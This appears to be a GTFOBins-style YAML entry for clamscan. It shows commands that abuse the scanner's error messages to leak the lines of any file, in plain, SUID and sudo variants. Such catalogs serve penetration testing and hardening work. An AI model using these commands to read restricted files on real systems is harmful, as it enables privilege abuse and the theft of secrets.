---
description: Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using `sed`.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        TF=$(mktemp -d)
        touch $TF/empty.yara
        clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
  suid:
    - code: |
        LFILE=file_to_read
        TF=$(mktemp -d)
        touch $TF/empty.yara
        ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
  sudo:
    - code: |
        LFILE=file_to_read
        TF=$(mktemp -d)
        touch $TF/empty.yara
        sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
---
